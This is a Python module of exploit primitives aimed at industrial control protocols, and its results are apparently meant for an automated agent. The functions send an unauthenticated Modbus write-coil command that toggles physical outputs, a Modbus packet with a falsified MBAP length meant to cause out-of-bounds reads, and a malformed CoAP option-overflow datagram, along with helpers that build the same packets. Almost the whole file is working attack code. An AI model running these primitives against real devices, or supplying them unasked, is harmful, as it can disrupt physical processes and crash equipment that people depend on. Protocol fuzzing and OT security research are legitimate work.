"""ot_exploits.py — OT protocol exploit primitives (Modbus TCP, CoAP).

All functions return structured dicts for agent consumption.
Packets are built with raw struct packing so the toolkit has zero
heavyweight dependencies beyond scapy (used only for hex-dump utilities).
"""

import socket
import struct
import time


# ── Modbus TCP helpers ────────────────────────────────────────────────

def _build_mbap(transaction_id: int, unit_id: int, pdu: bytes) -> bytes:
    """Build an MBAP (Modbus Application Protocol) header + PDU."""
    protocol_id = 0x0000
    length = len(pdu) + 1  # PDU length + unit-id byte
    header = struct.pack(">HHHB", transaction_id, protocol_id, length, unit_id)
    return header + pdu


def _send_tcp(ip: str, port: int, payload: bytes, timeout: float = 5.0) -> dict:
    """Send a TCP payload and return the response or timeout info."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.sendall(payload)
            try:
                resp = s.recv(4096)
                return {
                    "success": True,
                    "response_hex": resp.hex(),
                    "response_len": len(resp),
                }
            except socket.timeout:
                return {"success": True, "response_hex": "", "response_len": 0,
                        "details": "No response within timeout (device may have silently accepted)"}
    except (ConnectionRefusedError, ConnectionResetError) as e:
        return {"success": False, "details": f"Connection failed: {e}"}
    except socket.timeout:
        return {"success": False, "details": "TCP connect timed out"}
    except OSError as e:
        return {"success": False, "details": str(e)}


def _send_udp(ip: str, port: int, payload: bytes, timeout: float = 5.0) -> dict:
    """Send a UDP datagram and return any response."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(timeout)
            s.sendto(payload, (ip, port))
            try:
                resp, _ = s.recvfrom(4096)
                return {
                    "success": True,
                    "response_hex": resp.hex(),
                    "response_len": len(resp),
                }
            except socket.timeout:
                return {"success": True, "response_hex": "", "response_len": 0,
                        "details": "No UDP response (device may have dropped packet)"}
    except OSError as e:
        return {"success": False, "details": str(e)}


# ── Public exploit primitives ─────────────────────────────────────────

def modbus_write_coil(ip: str, port: int = 502, action: str = "off") -> dict:
    """Send a Modbus Write Single Coil (FC 0x05) to toggle physical state.

    action: "on" -> coil value 0xFF00, "off" -> coil value 0x0000
    """
    coil_value = 0xFF00 if action == "on" else 0x0000
    # FC 0x05, coil address 0x0000, coil value
    pdu = struct.pack(">BHH", 0x05, 0x0000, coil_value)
    packet = _build_mbap(transaction_id=1, unit_id=1, pdu=pdu)
    result = _send_tcp(ip, port, packet)
    result["attack"] = "modbus_write_coil"
    result["payload_hex"] = packet.hex()
    result["action"] = action
    return result


def modbus_mbap_overflow(ip: str, port: int = 502) -> dict:
    """Send a Modbus packet with MBAP Length far exceeding the actual PDU.

    The header claims a length of 2048 bytes but only ~6 follow, testing
    for out-of-bounds reads in the Zephyr LwIP TCP reassembly path.
    """
    pdu = struct.pack(">BHH", 0x03, 0x0000, 0x0001)  # FC 0x03 Read Holding Registers
    # Intentionally lie: claim length = 2048, actual PDU+unit = 6 bytes
    header = struct.pack(">HHHB", 2, 0x0000, 2048, 1)
    packet = header + pdu
    result = _send_tcp(ip, port, packet, timeout=10.0)
    result["attack"] = "modbus_mbap_overflow"
    result["payload_hex"] = packet.hex()
    result["claimed_length"] = 2048
    result["actual_length"] = len(pdu) + 1
    return result


def coap_option_overflow(ip: str, port: int = 5683) -> dict:
    """Send a malformed CoAP packet with Option Delta/Length pointing past the datagram.

    CoAP header (4 bytes):
      Ver=1, Type=CON(0), TKL=0, Code=GET(0.01), MsgID=0x1337
    Followed by a single option byte where delta=13 (extended 1-byte) and
    length=13 (extended 1-byte) both set to 0xFF, creating an option that
    claims to span 268+ bytes but the datagram ends immediately after.
    """
    #  Ver/Type/TKL  Code   MsgID
    coap_header = struct.pack(">BBH", 0x40, 0x01, 0x1337)
    # Option byte: delta=13 (use ext byte), length=13 (use ext byte)
    # ext_delta=0xFF -> actual delta = 13+255 = 268
    # ext_length=0xFF -> actual option length = 13+255 = 268
    # But we provide ZERO bytes of option value -> parser reads past end
    option_byte = bytes([0xDD])  # hi-nibble=13, lo-nibble=13
    ext_delta = bytes([0xFF])
    ext_length = bytes([0xFF])
    packet = coap_header + option_byte + ext_delta + ext_length
    result = _send_udp(ip, port, packet, timeout=5.0)
    result["attack"] = "coap_option_overflow"
    result["payload_hex"] = packet.hex()
    return result


# ── Packet introspection (for tests / debugging) ─────────────────────

def build_modbus_write_coil_packet(action: str = "off") -> bytes:
    """Return the raw Modbus Write Single Coil packet bytes (no I/O)."""
    coil_value = 0xFF00 if action == "on" else 0x0000
    pdu = struct.pack(">BHH", 0x05, 0x0000, coil_value)
    return _build_mbap(transaction_id=1, unit_id=1, pdu=pdu)


def build_modbus_overflow_packet() -> bytes:
    """Return the raw MBAP-overflow packet bytes (no I/O)."""
    pdu = struct.pack(">BHH", 0x03, 0x0000, 0x0001)
    header = struct.pack(">HHHB", 2, 0x0000, 2048, 1)
    return header + pdu


def build_coap_overflow_packet() -> bytes:
    """Return the raw malformed CoAP packet bytes (no I/O)."""
    coap_header = struct.pack(">BBH", 0x40, 0x01, 0x1337)
    option_byte = bytes([0xDD])
    ext_delta = bytes([0xFF])
    ext_length = bytes([0xFF])
    return coap_header + option_byte + ext_delta + ext_length
